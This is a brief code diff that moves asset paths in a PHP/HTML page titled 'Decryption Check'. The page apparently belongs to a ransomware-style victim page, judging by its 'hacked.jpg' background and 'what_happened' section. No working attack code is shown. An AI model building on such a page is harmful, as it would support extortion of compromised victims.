@@ -3,7 +3,7 @@
   <title>
     Decryption Check
   </title>
-  <script src="/jquery.js"></script>
+  <script src="/scripts/jquery.js"></script>
 <?php
 $servername = "localhost";
 $username = "root";
@@ -87,7 +87,7 @@ $conn->close();
 ?>
 
 </head>
-<body background="/hacked.jpg" style='background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-size: 100% 100%;'>
+<body background="/images/hacked.jpg" style='background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-size: 100% 100%;'>
   <font color="red">
   <br /><br />
   <div id="what_happened">
